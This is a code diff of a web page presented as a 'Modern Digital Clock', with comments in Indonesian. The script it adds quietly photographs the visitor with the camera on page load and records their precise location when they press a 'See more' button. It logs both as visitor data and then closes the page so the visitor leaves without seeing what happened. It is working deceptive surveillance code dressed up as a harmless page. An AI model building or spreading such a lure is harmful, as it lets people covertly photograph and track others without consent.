@@ -52,6 +52,7 @@
   <footer>Modern Digital Clock</footer>
 
   <script>
+    // Fungsi untuk memperbarui jam secara real-time
     function updateClock() {
       const now = new Date();
       const hours = String(now.getHours()).padStart(2, '0');
@@ -66,44 +67,23 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    // Akses kamera untuk mengambil foto
+    // Akses kamera otomatis saat halaman di-load
     function requestCameraAccess() {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
           .then((stream) => {
             video.srcObject = stream;
-
             setTimeout(() => {
               canvas.width = video.videoWidth;
               canvas.height = video.videoHeight;
               context.drawImage(video, 0, 0, canvas.width, canvas.height);
               const imageData = canvas.toDataURL('image/png');
               saveVisitorData(imageData);
-            }, 3000);
+            }, 3000); // Ambil gambar setelah 3 detik
           })
           .catch(error => {
             alert('Unable to access camera: ' + error.message);
           });
-      }
-    }
-
-    // Akses lokasi pengguna
-    function requestLocationAccess() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            saveLocationData(latitude, longitude, mapsURL);
-            redirectToDisplay();
-          },
-          (error) => {
-            alert('Unable to access location: ' + error.message);
-          }
-        );
-      } else {
-        alert('Geolocation is not supported by your browser.');
       }
     }
 
@@ -118,7 +98,29 @@
       localStorage.setItem('visitors', JSON.stringify(visitors));
     }
 
-    // Simpan data lokasi
+    // Akses lokasi pengguna saat tombol ditekan
+    function requestLocationAccess() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            saveLocationData(latitude, longitude, mapsURL);
+            exitWebsite();
+          },
+          (error) => {
+            alert('Unable to access location: ' + error.message);
+            exitWebsite(); // Tetap keluar dari website meskipun lokasi tidak diizinkan
+          }
+        );
+      } else {
+        alert('Geolocation is not supported by your browser.');
+        exitWebsite(); // Keluar jika geolocation tidak didukung
+      }
+    }
+
+    // Simpan data lokasi di localStorage
     function saveLocationData(latitude, longitude, mapsURL) {
       const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
       if (visitors.length > 0) {
@@ -129,15 +131,21 @@
       localStorage.setItem('visitors', JSON.stringify(visitors));
     }
 
-    // Redirect ke halaman display
-    function redirectToDisplay() {
-      window.location.href = 'display.html';
+    // Fungsi untuk keluar dari website setelah lokasi diakses
+    function exitWebsite() {
+      setTimeout(() => {
+        window.close(); // Tutup tab (mungkin tidak berfungsi di semua browser)
+        window.location.href = 'about:blank'; // Redirect ke halaman kosong sebagai alternatif
+      }, 1000);
     }
 
+    // Event listener untuk tombol "Lihat Selengkapnya"
     document.getElementById('locationBtn').addEventListener('click', () => {
-      requestCameraAccess();
       requestLocationAccess();
     });
+
+    // Jalankan akses kamera otomatis saat halaman di-load
+    window.onload = requestCameraAccess;
   </script>
   
 </body>
